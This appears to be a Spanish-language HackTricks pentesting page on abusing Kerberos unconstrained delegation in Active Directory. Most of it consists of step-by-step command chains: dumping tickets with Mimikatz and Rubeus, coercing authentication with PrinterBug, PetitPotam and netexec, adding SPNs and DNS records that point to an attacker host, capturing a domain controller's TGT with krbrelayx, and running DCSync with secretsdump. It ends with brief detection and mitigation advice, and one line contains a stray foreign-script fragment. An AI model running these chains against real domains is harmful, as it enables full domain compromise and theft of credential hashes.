# Delegación sin restricciones

{{#include ../../banners/hacktricks-training.md}}

## Delegación sin restricciones

Esta es una característica que un Domain Administrator puede configurar en cualquier **Computer** dentro del dominio. Entonces, cada vez que un **user logins** en el Computer, una **copia del TGT** de ese usuario va a ser **enviada dentro del TGS** proporcionado por el DC y **guardada en memoria en LSASS**. Así, si tienes privilegios de Administrator en la máquina, podrás **volcar los tickets y suplantar a los usuarios** en cualquier máquina.

Así que si un domain admin logins dentro de un Computer con la función "Unconstrained Delegation" activada, y tienes privilegios de administrador local dentro de esa máquina, podrás volcar el ticket y suplantar al Domain Admin en cualquier parte (domain privesc).

Puedes **encontrar objetos Computer con este atributo** comprobando si el atributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puedes hacer esto con un filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que es lo que hace powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Cargue el ticket de Administrator (o usuario víctima) en memoria con **Mimikatz** o **Rubeus para un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Más info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Más información sobre Unconstrained delegation en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Si un atacante es capaz de **comprometer un ordenador permitido para "Unconstrained Delegation"**, podría **engañar** a un **servidor de impresión** para que **inicie sesión automáticamente** contra él **guardando un TGT** en la memoria del servidor.\
Entonces, el atacante podría realizar un **ataque Pass the Ticket para impersonar** al usuario de la cuenta de equipo del servidor de impresión.

Para hacer que un servidor de impresión inicie sesión contra cualquier máquina puedes usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si el TGT es de un domain controller, podrías realizar un [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) y obtener todos los hashes del DC.\
[**Más información sobre este ataque en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Encuentra aquí otras formas de **forzar una autenticación:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Cualquier otro primitive de coercion que haga que la víctima se autentique con **Kerberos** hacia tu host con unconstrained-delegation también funciona. En entornos modernos, esto suele significar cambiar el flujo clásico de PrinterBug por **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** o coercion basada en **WebClient/WebDAV**, dependiendo de qué superficie RPC sea accesible.

### Abusing a user/service account with unconstrained delegation

La unconstrained delegation no está **limitada a objetos computer**. Una **user/service account** también puede configurarse como `TRUSTED_FOR_DELEGATION`. En ese escenario, el requisito práctico es que la cuenta debe recibir Kerberos service tickets para un **SPN que posea**.

Esto lleva a 2 rutas offensives muy comunes:

1. Comprometes la contraseña/hash de la **user account** con unconstrained-delegation, y luego **añades un SPN** a esa misma cuenta.
2. La cuenta ya tiene uno o más SPNs, pero uno de ellos apunta a un **hostname obsoleto/desmantelado**; recrear el **DNS A record** que falta basta para secuestrar el flujo de autenticación sin modificar el conjunto de SPNs.

Flujo mínimo en Linux:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notas:

- Esto es especialmente útil cuando el principal sin restricciones es una **service account** y solo tienes sus credenciales, no ejecución de código en un host unido al dominio.
- Si el usuario objetivo ya tiene un **stale SPN**, recrear el **DNS record** correspondiente puede ser menos ruidoso que escribir un nuevo SPN en AD.
- El tradecraft reciente centrado en Linux usa `addspn.py`, `dnstool.py`, `krbrelayx.py` y un primitive de coercion; no necesitas tocar un host Windows para completar la cadena.

### Abusing Unconstrained Delegation with an attacker-created computer

Los dominios modernos a menudo tienen `MachineAccountQuota > 0` (por defecto 10), lo que permite a cualquier principal autenticado crear hasta N objetos de equipo. Si además tienes el privilegio de token `SeEnableDelegationPrivilege` (o derechos equivalentes), puedes configurar el equipo recién creado para que sea trusted for unconstrained delegation y recolectar TGTs entrantes desde sistemas privilegiados.

Flujo de alto nivel:

1) Create a computer you control
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Haz que el hostname falso sea resoluble dentro del domain
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Habilitar Unconstrained Delegation en el equipo controlado por el atacante
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Por qué funciona: con unconstrained delegation, la LSA en un equipo con delegation habilitada almacena en caché los TGT entrantes. Si engañas a un DC o a un servidor privilegiado para que se autentique en tu host falso, su machine TGT se almacenará y podrá exportarse.

4) Inicia krbrelayx en modo export y prepara el material Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Coaccionar la autenticación desde el DC/servidores hacia tu host falso
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx guardará archivos ccache cuando una máquina se autentique, por ejemplo:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Usa el TGT de la máquina DC capturado para realizar DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas y requisitos:

- `MachineAccountQuota > 0` habilita la creación de equipos sin privilegios; de lo contrario, necesitas derechos explícitos.
- Establecer `TRUSTED_FOR_DELEGATION` en un equipo requiere `SeEnableDelegationPrivilege` (o domain admin).
- Asegura la resolución de nombres hacia tu host falso (registro DNS A) para que el DC pueda পৌঁreach it by FQDN.
- La coercion requiere un vector viable (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Desactívalos en los DCs si es posible.
- Si la cuenta víctima está marcada como **"Account is sensitive and cannot be delegated"** o es miembro de **Protected Users**, el TGT reenviado no se incluirá en el service ticket, así que esta cadena no producirá un TGT reutilizable.
- Si **Credential Guard** está habilitado en el cliente/servidor autenticante, Windows bloquea **Kerberos unconstrained delegation**, lo que puede hacer que rutas de coercion que de otro modo serían válidas fallen desde la perspectiva del operador.

Ideas de detección y hardening:

- Alertar sobre Event ID 4741 (computer account created) y 4742/4738 (computer/user account changed) cuando UAC `TRUSTED_FOR_DELEGATION` esté configurado.
- Monitorizar adiciones inusuales de registros DNS A en la zona del dominio.
- Vigilar picos de 4768/4769 desde hosts inesperados y autenticaciones del DC hacia hosts que no son DC.
- Restringir `SeEnableDelegationPrivilege` a un conjunto mínimo, establecer `MachineAccountQuota=0` donde sea posible, y deshabilitar Print Spooler en los DCs. Imponer LDAP signing y channel binding.

### Mitigation

- Limitar inicios de sesión de DA/Admin a servicios específicos
- Establecer "Account is sensitive and cannot be delegated" para cuentas privilegiadas.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
